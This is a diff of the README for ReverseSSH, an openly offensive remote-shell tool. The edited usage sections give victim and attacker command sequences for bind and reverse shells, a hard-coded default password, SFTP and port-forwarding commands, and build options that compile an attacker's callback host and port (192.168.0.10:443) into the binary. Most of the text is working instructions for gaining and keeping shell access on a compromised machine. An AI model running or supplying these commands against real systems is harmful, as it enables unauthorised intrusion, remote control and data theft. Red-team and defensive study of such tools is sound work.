@@ -19,7 +19,7 @@ Instead, you can go the way to simply deploy the **lightweight ssh server** (<1.
 ReverseSSH tries to bridge the gap between initial foothold on a target and full local privilege escalation.
 Its main strengths are the following:
 
-* **Fully interactive shell access**  (check windows caveats below)
+* **Fully interactive shell access** (check caveats for old windows versions below)
 * **File transfer via sftp**
 * **Local / remote / dynamic port forwarding**
 * **Can be used as bind- and reverse-shell**
@@ -52,7 +52,7 @@ Compiling additionally requires the following:
 
 ## Usage
 
-Once `reverse-ssh` is running, you can connect with any username and the default password `letmeinbrudipls`, the ssh key or whatever you specified during compilation.
+Once `reverse-ssh` is running on the victim, you can connect with any username and the default password `letmeinbrudipls`, the ssh key or whatever you specified during compilation.
 After all, it is just an ssh server:
 
 ```
@@ -69,28 +69,30 @@ $ sftp -P <RPORT> <RHOST>
 $ ssh -p <RPORT> -D 9050 <RHOST>
 ```
 
-### Simple bind shell scenario
+### Running ReverseSSH as bind shell
 
 ```
 # Victim
 victim$ ./reverse-ssh
 
 # Attacker (default password: letmeinbrudipls)
-attacker$ ssh -p 31337 <LHOST>
+attacker$ ssh -p 31337 <RHOST>
 ```
 
-### Simple reverse shell scenario
+### Running ReverseSSH as reverse shell
+
+Note: you can compile ReverseSSH with parameters for LHOST and LPORT to ease execution on the target, [see below](#build-tricks)
 
 ```
 # On attacker (get ready to catch the incoming request;
 # can be omitted if you already have an ssh daemon running, e.g. OpenSSH)
 # NOTE: LPORT of 8888 collides with incoming connections; use the flag `-b 8889` or similar on the victim in that case
-attacker$ ./reverse-ssh -l :<LPORT>
+attacker$ ./reverse-ssh -v -l -p <LPORT>
 
 # On victim
 victim$ ./reverse-ssh -p <LPORT> <LHOST>
-# or in case of an ssh daemon listening at port 22 with user/pass authentication
-victim$ ./reverse-ssh <USER>@<LHOST>
+# or in case of an ssh daemon listening at port 22 with password authentication for user 'kali'
+victim$ ./reverse-ssh -p 22 kali@<LHOST>
 
 # On attacker (default password: letmeinbrudipls)
 attacker$ ssh -p 8888 127.0.0.1
@@ -165,11 +167,24 @@ $ make
 $ make compressed
 ```
 
-You can also specify a different default shell (`RS_SHELL`), a personalized password (`RS_PASS`) or an authorized key (`RS_PUB`) when compiling:
+### Build tricks
 
-```
+You can also specify one or more of the following environmental variables when compiling to customize ReverseSSH to your use case:
+
+* `RS_SHELL` to change the default shell
+* `RS_PASS` to provide your personalized password
+* `RS_PUB` to provide your personalized an authorized key
+* `LUSER` to change the default username of the ssh connection attempt
+* `LHOST` to provide a default LHOST value and make **ReverseSSH default to the reverse scenario**
+* `LPORT` to change the default listening port or port where an ssh connection attempt is sent to
+* `BPORT` to change the default listening port of reverse connections on the attacker machine; **0 means any free port is taken**
+
+```shell
 $ ssh-keygen -t ed25519 -f id_reverse-ssh
+
 $ RS_SHELL="/bin/sh" RS_PASS="secret" RS_PUB="$(cat id_reverse-ssh.pub)" make compressed
+
+$ LHOST="192.168.0.10" LPORT="443" BPORT="0" RS_PUB="$(cat id_reverse-ssh.pub)" make compressed
 ```
 
 ### Building for different operating systems or architectures
